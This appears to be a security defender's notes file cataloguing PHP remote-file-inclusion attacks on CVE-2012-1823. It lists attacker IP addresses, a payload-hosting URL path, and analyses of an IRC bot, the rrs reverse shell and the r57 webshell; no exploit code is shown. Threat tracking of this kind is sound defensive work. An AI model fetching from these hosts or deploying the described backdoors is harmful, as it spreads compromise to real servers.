#PHP-RFI Attacks
#This is a collection of PHP RFI attackers I've seen on a variety of servers I'm responsible for securing.
#Essentially, these servers were seen attempting to exploit CVE 2012-1823, 2311, 2335 and 2336.
# Apparently a lot of botnets spread via this vulnerability combined with RFI attacks.
# This file has the following format:
#Pitcher: Who threw the exploit
#Catcher: Who is the exploiter telling the target server to call back to for a payload
#NSlookup (pitcher/catcher): Domain name/data for Pitchers and Catchers
#WHOIS (pitcher/catcher): collects a bunch of whois data for pitchers and catchers -- route, org name, country, abuse contacts, AS number... if they were available.
#Payload: payload seen in PHP code attackers tried to RFI/prepend to the server
#Description: what does the payload do?
#Server: any servers the payload is seen calling back to
#Port: port the payload calls back to
#Channel: for IRC bots, what channel does it connect to?
#NSlookup: domain info for the payload IP address
#WHOIS: whois data for the payload IP address
#Notes: misc notes.

- The URL encoding is the part of the RFI exploit, where the header/PHP below is the portion that executes a payload, or tells the attacked system where to call back to get the payload.. Any information on this?
- Also saw MANY other ips pitching this the week of 9/12/14

Notes:
- Does the Catcher IRC Server look familiar? I thought it would. Peak still has yet to fix their server actively serving payloads. 
- Also saw 80.73.9.164 Referring to 208.85.177.238/speedtest/.a/hb/php07 (same payload)
- 187.63.160.3 was seen referring to .x/hb/phk00

Description: Multi-Part IRC bot/backdoor
Server: N/A (Will require dynamic analysis)
Port: N/A (Will require dynamic analysis)
Channel: N/A (Will require dynamic analysis)
NSlookup: N/A
WHOIS: N/A
Notes:
- I've seen this payload in the past, even mentioned it on my twitter timeline IIRC
- x.tgz contains three binaries: .klogd, rrs and syslogd
- all binaries are UPX packed.
- .klogd: Binary IRC backdoor. At this point and time, it is unknown who or what it connects to 
- string analysis has references to stun.xten.com, and also has several strings referring to STUN protocol.
- string analysis also refers to syslogd and rrs, so likely this is the primary means of target interaction.
- string analysis shows several references to php directories; likely uses php RFI as primarily means of spreading.
- rrs: (reverse remote shell) is well-known reverse shell/backdoor. Supports strong encryption as well. http://freecode.com/projects/rrs
- syslogd: pnscan, a simple but fast port scanner.

Description: R57 PHP-based Webshell
Notes:
-Seen this payload before. Looks like the actors are shifting Pitchers and catchers. Still has a fixation on targeting the energy industry.
-r57 is a php webshell in the same family as B374k and c99.
